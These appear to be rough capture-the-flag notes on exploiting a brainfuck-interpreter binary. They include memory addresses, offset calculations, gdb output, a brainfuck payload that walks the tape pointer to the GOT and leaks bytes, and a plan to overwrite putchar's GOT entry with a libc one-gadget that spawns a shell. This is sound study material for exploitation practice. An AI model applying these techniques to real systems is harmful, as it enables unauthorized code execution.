We can see that we have a global variable p that represnets the pointer for the brainfuck program.

We can see that it's address is 0x804a080.

We also have tape variable but im not sure yet what it is doing yet.


Ok I it seems that the calculations are done on tape - address 0x804a0a0.



My idea right now is to reach the address of the getchar in the plt and overwrite it with the address of system or something.


The address of the getchar is  0x804a00c (or 0x8048440 , Im not sure about that yet.)


We can calculate the offset we need like that
>>> 0x0804a0a0 - 0x804a00c
148
>>> print '<' * 148
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<


We can find libc_system in 0xf7dd3800




Breakpoints:
Num     Type           Disp Enb Address    What
2       breakpoint     keep y   0x080485f3 <do_brainfuck+23>
        breakpoint already hit 155 times
        x/wx 0x804a080
        x/32wx 0x804a0a0
3       breakpoint     keep y   0x08048629 <do_brainfuck+77>
        breakpoint already hit 5 times



The _start is at 0x80484e0


My current thoughts are:
1. I need to leak the address of libc
2. Then I need to rewind the program by overwriting the address of getchar got with _start
3. Then I can find the address of system and run the usual exploit


Note:
* The got stays the same even after jumping to _start.


<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>..>.>.>.,


We have an interesting gadget:
0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

We need to use this gadget to get our shell.

We can get eax to NULL using the putchar functionality.
do_brainfuck+5E   mov     eax, ds:p
do_brainfuck+63   movzx   eax, byte ptr [eax] ; Move with Zero-Extend
do_brainfuck+66   movsx   eax, al         ; Move with Sign-Extend
do_brainfuck+69   mov     [esp], eax
do_brainfuck+6C   call    _putchar

Just make p point to 0 and overwrite the got address of putchar with our gadget.

Now we need to figure out how to set the esi to the address of the got.

The modification of esi register might require another gadget but im not sure about that.
There might be an easier way to do that.


Some potential gadgets:

0x00176951 : inc esi ; or ebp, dword ptr [ebp + 0xa] ; ret
0x0018fe7c : inc esi ; or ebp, dword ptr [ebx + 0xa] ; ret

